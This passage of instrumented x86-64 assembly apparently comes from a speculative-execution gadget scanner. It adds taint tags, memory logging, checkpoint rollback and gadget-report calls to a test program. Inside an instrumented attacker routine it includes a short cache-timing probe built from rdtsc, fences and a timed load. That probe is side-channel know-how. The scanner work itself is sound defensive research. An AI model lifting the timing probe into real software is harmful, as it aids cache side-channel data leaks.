            movq %rsi,(%r12)
            movq %r13,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            movq %rax,8(%rsp)
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            xorl %esi,%esi
            orb (dift_reg_tags+7),%sil
            movb %sil,(dift_reg_tags)
.L__dift_done__teapot___626:

            nop
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            leaq 1(%rbp),%rax
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            xorl %edx,%edx
            orb (dift_reg_tags+6),%dl
            orb (dift_reg_tags),%dl
            leaq 32(%rsp),%rsi
            btcq $45,%rsi
            movabsq $72340172838076673,%r13
            imulq %r13,%rdx
            movq (memory_history_top),%r12
            movq (%rsi),%r13
            movq %rsi,(%r12)
            movq %r13,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            movq %rdx,(%rsi)
            addq $8,%rsi
.L__dift_done__teapot___627:

            nop
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            leaq 32(%rsp),%rsi
            movq (memory_history_top),%r12
            movq (%rsi),%r13
            movq %rsi,(%r12)
            movq %r13,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            movq %rax,32(%rsp)
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            xorl %edx,%edx
            orb (dift_reg_tags+7),%dl
            orb (dift_reg_tags+6),%dl
            leaq 48(%rsp),%rsi
            btcq $45,%rsi
            movq $16843009,%r13
            imulq %r13,%rdx
            movq (memory_history_top),%r12
            movq (%rsi),%r13
            movq %rsi,(%r12)
            movq %r13,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            movl %edx,(%rsi)
            addq $8,%rsi
.L__dift_done__teapot___629:

            nop
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            leaq 48(%rsp),%rsi
            movq (memory_history_top),%r12
            movq (%rsi),%r13
            movq %rsi,(%r12)
            movq %r13,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            movl %ebp,48(%rsp)
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            xorl %edx,%edx
            orb (dift_reg_tags+6),%dl
            orb (dift_reg_tags),%dl
            leaq 52(%rsp),%rsi
            btcq $45,%rsi
            movq $16843009,%r13
            imulq %r13,%rdx
            movq (memory_history_top),%r12
            movq (%rsi),%r13
            movq %rsi,(%r12)
            movq %r13,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            movl %edx,(%rsi)
            addq $8,%rsi
.L__dift_done__teapot___631:

            nop
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            leaq 52(%rsp),%rsi
            movq (memory_history_top),%r12
            movq (%rsi),%r13
            movq %rsi,(%r12)
            movq %r13,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            movl %eax,52(%rsp)
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            xorl %esi,%esi
            movb %sil,(dift_reg_tags+3)
.L__dift_done__teapot___633:

            nop
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            movl $90,%edx
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            xorl %r13d,%r13d
            orb (dift_reg_tags+7),%r13b
            movb %r13b,(dift_reg_tags+4)
.L__dift_done__teapot___634:

            nop
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            movl %ebp,%esi
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            xorl %r13d,%r13d
            orb (dift_reg_tags),%r13b
            movb %r13b,(dift_reg_tags+5)
.L__dift_done__teapot___635:

            nop
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            movl %eax,%edi
            leaq -8(%rsp),%r13
            movq (memory_history_top),%r12
            movq (%r13),%rbp
            movq %r13,(%r12)
            movq %rbp,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            callq otherArray_init__teapot__
.L__ret_transform_target_attacker_function__890c0f0d_6768_4b90_aebd_2c5982c3de2f__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $16,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            xorl %edx,%edx
            orb (dift_reg_tags+6),%dl
            orb (dift_reg_tags),%dl
            leaq 40(%rsp),%rsi
            btcq $45,%rsi
            movabsq $72340172838076673,%r13
            imulq %r13,%rdx
            movq (memory_history_top),%r12
            movq (%rsi),%r13
            movq %rsi,(%r12)
            movq %r13,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            movq %rdx,(%rsi)
            addq $8,%rsi
.L__dift_done__teapot___638:

            nop
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            leaq 40(%rsp),%rsi
            movq (memory_history_top),%r12
            movq (%rsi),%r13
            movq %rsi,(%r12)
            movq %r13,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            movq %rax,40(%rsp)
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            xorl %esi,%esi
            movb %sil,(dift_reg_tags+3)
.L__dift_done__teapot___640:

            nop
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            movl $0,%edx
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            xorl %ebp,%ebp
            orb (dift_reg_tags+6),%bpl
            orb (dift_reg_tags+1),%bpl
            leaq 64(%rsp),%rsi
            btcq $45,%rsi
            movabsq $72340172838076673,%r13
            imulq %r13,%rbp
            movq (memory_history_top),%r12
            movq (%rsi),%r13
            movq %rsi,(%r12)
            movq %r13,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            movq %rbp,(%rsi)
            addq $8,%rsi
.L__dift_done__teapot___641:

            nop
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            leaq 64(%rsp),%rsi
            movq (memory_history_top),%r12
            movq (%rsi),%r13
            movq %rsi,(%r12)
            movq %r13,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            movq (instruction_cnt),%r12
            addq $3,%r12
            cmpq $250,%r12
            jge restore_checkpoint_ROB_LEN@PLT

            movq %r12,(instruction_cnt)
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            movq %rbx,64(%rsp)
.L_18e1__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $29,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            xorl %esi,%esi
            movb %sil,(dift_reg_tags+2)
.L__dift_done__teapot___645:

            nop
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            movq $-1,%rcx
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            leaq 72(%rsp),%rsi
            xorq %r12,%r12
            orb (dift_reg_tags+6),%r12b
            testb $48,%r12b
            je .L__attacker_tags_check__teapot___646

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %rsi,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_CACHE@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__attacker_tags_check__teapot___646:

            testb $2,%r12b
            je .L__asan_check__teapot___646

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %rsi,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $32,(dift_reg_queued_tag)
            movb $5,(dift_reg_queued_id)
.L__asan_check__teapot___646:

            movq %rsi,%r13
            shrq $3,%r13
            movb 2147450880(%r13),%r13b
            testb %r13b,%r13b
            je .L__mem_operand_policy_done__teapot___646
.L__asan_check_fail__teapot___646:

            testb $1,%r12b
            je .L__asan_check_fail_non_attacker__teapot___646
.L__asan_check_fail_attacker__teapot___646:

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %rsi,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $16,(dift_reg_queued_tag)
            movb $5,(dift_reg_queued_id)
            jmp .L__mem_operand_policy_done__teapot___646
.L__asan_check_fail_non_attacker__teapot___646:

            orb $2,(dift_reg_queued_tag)
            movb $5,(dift_reg_queued_id)
.L__mem_operand_policy_done__teapot___646:

            nop
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            leaq 72(%rsp),%r12
            btcq $45,%r12
            xorl %r13d,%r13d
            orb (dift_reg_tags+6),%r13b
            orb (%r12),%r13b
            movb %r13b,(dift_reg_tags+5)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___647

            movb (dift_reg_queued_tag),%r13b
            movzbq (dift_reg_queued_id),%rsi
            orb %r13b,(dift_reg_tags)(%rsi)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___647:

            nop
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            movq 72(%rsp),%rdi
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            xorl %esi,%esi
            movb %sil,(dift_reg_tags)
.L__dift_done__teapot___648:

            nop
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            movq (instruction_cnt),%r12
            addq $3,%r12
            cmpq $250,%r12
            jge restore_checkpoint_ROB_LEN@PLT

            movq %r12,(instruction_cnt)
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            movl $0,%eax

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $25,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            jmp restore_checkpoint_EXT_LIB@PLT

            repne scasb (%rdi),%al

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $33,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            xorl %esi,%esi
            orb (dift_reg_tags+2),%sil
            movb %sil,(dift_reg_tags)
.L__dift_done__teapot___653:

            nop
            movq %rcx,%rax
            notq %rax
            subq $1,%rax
            xorl %r12d,%r12d
            orb (dift_reg_tags),%r12b
            orb (dift_reg_tags+3),%r12b
            testb $48,%r12b
            je .L__check_ok__teapot___654

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq $0,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_PORT@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__check_ok__teapot___654:

            nop
            movq (instruction_cnt),%r12
            addq $5,%r12
            cmpq $250,%r12
            jge restore_checkpoint_ROB_LEN@PLT

            movq %r12,(instruction_cnt)
            cmpq %rdx,%rax
            leaq (.__trampoline__732d7cd7_aa82_4282_ae2d_2df653e22ee0__teapot__)(%rip),%r12
            movq %r12,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___656)(%rip),%r12
            movq %r12,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__732d7cd7_aa82_4282_ae2d_2df653e22ee0__teapot__)(%rip),%r12
            movq %r12,(checkpoint_target_metadata+16)
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___656:

            nop
            jbe .L_1acf__teapot__
.L__trampoline_target__479025d9_6ebc_4cf3_a8d3_04093a6b7dc9__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $40,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            xorl %r12d,%r12d
            orb (dift_reg_tags+3),%r12b
            orb (dift_reg_tags+3),%r12b
            testb $48,%r12b
            je .L__check_ok__teapot___658

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq $0,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_PORT@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__check_ok__teapot___658:

            nop
            movq (instruction_cnt),%r12
            addq $2,%r12
            cmpq $250,%r12
            jge restore_checkpoint_ROB_LEN@PLT

            movq %r12,(instruction_cnt)
            testq %rdx,%rdx
            leaq (.__trampoline__a84f83ad_1e7c_4966_8724_0854a0275058__teapot__)(%rip),%r12
            movq %r12,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___660)(%rip),%r12
            movq %r12,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__a84f83ad_1e7c_4966_8724_0854a0275058__teapot__)(%rip),%r12
            movq %r12,(checkpoint_target_metadata+16)
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___660:

            nop
            jne .L_1acf__teapot__
.L__trampoline_target__bc628f63_d6f9_40e8_b280_350f4b94be03__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $47,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            xorl %edx,%edx
            orb (dift_reg_tags+6),%dl
            leaq 56(%rsp),%rsi
            btcq $45,%rsi
            movabsq $72340172838076673,%r13
            imulq %r13,%rdx
            movq (memory_history_top),%r12
            movq (%rsi),%r13
            movq %rsi,(%r12)
            movq %r13,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            movq %rdx,(%rsi)
            addq $8,%rsi
.L__dift_done__teapot___662:

            nop
            leaq 56(%rsp),%rsi
            movq (memory_history_top),%r12
            movq (%rsi),%r13
            movq %rsi,(%r12)
            movq %r13,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            movq $100,56(%rsp)
            movq (instruction_cnt),%r12
            addq $2,%r12
            cmpq $250,%r12
            jge restore_checkpoint_ROB_LEN@PLT

            movq %r12,(instruction_cnt)
            jmp .L_19cd__teapot__
.L_191e__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $53,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            xorl %r15d,%r15d
            movb %r15b,(dift_reg_tags+5)
.L__dift_done__teapot___666:

            nop
            leaq (.L_206f)(%rip),%rdi
            leaq -8(%rsp),%r15
            movq (memory_history_top),%r12
            movq (%r15),%r14
            movq %r15,(%r12)
            movq %r14,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            jmp restore_checkpoint_EXT_LIB@PLT

            callq perror@PLT
.L__ret_transform_target_attacker_function__badd2d8b_82e0_47b4_bbbf_7d20a8f1e6b3__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $60,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            movq (instruction_cnt),%r12
            addq $1,%r12
            cmpq $250,%r12
            jge restore_checkpoint_ROB_LEN@PLT

            movq %r12,(instruction_cnt)
            jmp .L_1b0e__teapot__
.L_192f__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $19,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            xorl %esi,%esi
            movb %sil,(dift_reg_tags+4)
.L__dift_done__teapot___672:

            nop
            movl $13,%esi
            movq (instruction_cnt),%r12
            addq $2,%r12
            cmpq $250,%r12
            jge restore_checkpoint_ROB_LEN@PLT

            movq %r12,(instruction_cnt)
            jmp .L_1985__teapot__
.L_1936__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $27,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            jmp restore_checkpoint_EXT_LIB@PLT

            mfence 
            lfence 
            xorl %r13d,%r13d
            movb %r13b,(dift_reg_tags)
            movb %r13b,(dift_reg_tags+3)
.L__dift_done__teapot___676:

            nop
            rdtsc 
            shlq $32,%rdx
            xorl %r13d,%r13d
            orb (dift_reg_tags),%r13b
            orb (dift_reg_tags+3),%r13b
            movb %r13b,(dift_reg_tags)
.L__dift_done__teapot___677:

            nop
            orq %rdx,%rax
            lfence 
            xorl %r13d,%r13d
            orb (dift_reg_tags),%r13b
            movb %r13b,(dift_reg_tags+8)
.L__dift_done__teapot___678:

            nop
            movq %rax,%r8
            xorl %r13d,%r13d
            orb (dift_reg_tags+5),%r13b
            movb %r13b,(dift_reg_tags)
.L__dift_done__teapot___679:

            nop
            movq %rdi,%rax
            shlq $12,%rax
            xorl %r13d,%r13d
            orb (dift_reg_tags),%r13b
            orb (dift_reg_tags+15),%r13b
            movb %r13b,(dift_reg_tags)
.L__dift_done__teapot___680:

            nop
            addq %r15,%rax
            leaq (%rax),%r13
            xorq %r12,%r12
            orb (dift_reg_tags),%r12b
            testb $48,%r12b
            je .L__attacker_tags_check__teapot___681

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %r13,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_CACHE@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__attacker_tags_check__teapot___681:

            testb $2,%r12b
            je .L__asan_check__teapot___681

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %r13,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $32,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__asan_check__teapot___681:

            movq %r13,%rdx
            shrq $3,%rdx
            movb 2147450880(%rdx),%dl
            testb %dl,%dl
            je .L__mem_operand_policy_done__teapot___681

            movb %r13b,%bpl
            andb $7,%bpl
            cmpb %dl,%bpl
            jl .L__mem_operand_policy_done__teapot___681
.L__asan_check_fail__teapot___681:

            testb $1,%r12b
            je .L__asan_check_fail_non_attacker__teapot___681
.L__asan_check_fail_attacker__teapot___681:

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %r13,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $16,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
            jmp .L__mem_operand_policy_done__teapot___681
.L__asan_check_fail_non_attacker__teapot___681:

            orb $2,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__mem_operand_policy_done__teapot___681:

            nop
            leaq (%rax),%r12
            btcq $45,%r12
            xorl %edx,%edx
            orb (dift_reg_tags),%dl
            orb (%r12),%dl
            movb %dl,(dift_reg_tags)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___682

            movb (dift_reg_queued_tag),%dl
            movzbq (dift_reg_queued_id),%r13
            orb %dl,(dift_reg_tags)(%r13)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___682:

            nop
            movb (%rax),%al
            xorl %r13d,%r13d
            movb %r13b,(dift_reg_tags)
            movb %r13b,(dift_reg_tags+3)
            movb %r13b,(dift_reg_tags+2)
.L__dift_done__teapot___683:

            nop
            rdtscp 
            shlq $32,%rdx
            xorl %r13d,%r13d
            orb (dift_reg_tags),%r13b
            orb (dift_reg_tags+3),%r13b
            movb %r13b,(dift_reg_tags)
.L__dift_done__teapot___684:

            nop
            orq %rdx,%rax
            lfence 
            xorl %r13d,%r13d
            orb (dift_reg_tags+8),%r13b
            orb (dift_reg_tags),%r13b
            movb %r13b,(dift_reg_tags)
.L__dift_done__teapot___685:

            nop
            subq %r8,%rax
            cmpq %rax,%r14
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            xorl %r13d,%r13d
            movb %r13b,(dift_reg_tags)
.L__dift_done__teapot___686:

            nop
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            setae %al
            movzbl %al,%eax
            leaq 96(%rsp,%rdi,8),%r13
            btcq $45,%r13
            xorl %ebx,%ebx
            orb (dift_reg_tags),%bl
            orb (dift_reg_tags+6),%bl
            orb (dift_reg_tags+5),%bl
            orb (%r13),%bl
            movabsq $72340172838076673,%rbp
            imulq %rbp,%rbx
            movq (memory_history_top),%r12
            movq (%r13),%rbp
            movq %r13,(%r12)
            movq %rbp,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            movq %rbx,(%r13)
            addq $8,%r13
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___687

            movb (dift_reg_queued_tag),%bl
            movzbq (dift_reg_queued_id),%rbp
            orb %bl,(dift_reg_tags)(%rbp)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___687:

            nop
            leaq 96(%rsp,%rdi,8),%r13
            movq (memory_history_top),%r12
            movq (%r13),%rbp
            movq %r13,(%r12)
            movq %rbp,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            addq %rax,96(%rsp,%rdi,8)
.L_1975__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $36,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            addq $167,%rsi
            xorl %r12d,%r12d
            orb (dift_reg_tags+4),%r12b
            testb $48,%r12b
            je .L__check_ok__teapot___690

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq $0,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_PORT@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__check_ok__teapot___690:

            nop
            movq (instruction_cnt),%r12
            addq $3,%r12
            cmpq $250,%r12
            jge restore_checkpoint_ROB_LEN@PLT

            movq %r12,(instruction_cnt)
            cmpq $42765,%rsi
            leaq (.__trampoline__a0b2349d_d497_44ab_adc1_f79988d7df99__teapot__)(%rip),%r12
            movq %r12,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___692)(%rip),%r12
            movq %r12,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__a0b2349d_d497_44ab_adc1_f79988d7df99__teapot__)(%rip),%r12
            movq %r12,(checkpoint_target_metadata+16)
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___692:

            nop
            je .L_1991__teapot__
.L_1985__teapot__:
.L__trampoline_target__3a392698_d00d_43c5_a4bb_0b58dafc3b41__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $43,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            xorl %r13d,%r13d
            orb (dift_reg_tags+4),%r13b
            movb %r13b,(dift_reg_tags+5)
.L__dift_done__teapot___694:

            nop
            movzbl %sil,%edi
            xorl %r12d,%r12d
            orb (dift_reg_tags+4),%r12b
            testb $48,%r12b
            je .L__check_ok__teapot___695

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq $0,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_PORT@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__check_ok__teapot___695:

            nop
            movq (instruction_cnt),%r12
            addq $3,%r12
            cmpq $250,%r12
            jge restore_checkpoint_ROB_LEN@PLT

            movq %r12,(instruction_cnt)
            cmpb $90,%sil
            leaq (.__trampoline__19a633a3_58ec_450c_a1a7_e5cecca00a47__teapot__)(%rip),%r12
            movq %r12,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___697)(%rip),%r12
            movq %r12,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__19a633a3_58ec_450c_a1a7_e5cecca00a47__teapot__)(%rip),%r12
            movq %r12,(checkpoint_target_metadata+16)
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___697:

            nop
            jne .L_1936__teapot__
.L__trampoline_target__3ee3f720_b829_4976_b024_2b3d32a69ba9__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $52,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            movq (instruction_cnt),%r12
            addq $1,%r12
            cmpq $250,%r12
            jge restore_checkpoint_ROB_LEN@PLT

            movq %r12,(instruction_cnt)
            jmp .L_1975__teapot__
.L_1991__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $56,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            leaq 88(%rsp),%r13
            xorq %r12,%r12
            orb (dift_reg_tags+6),%r12b
            testb $48,%r12b
            je .L__attacker_tags_check__teapot___701

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %r13,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_CACHE@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__attacker_tags_check__teapot___701:

            testb $2,%r12b
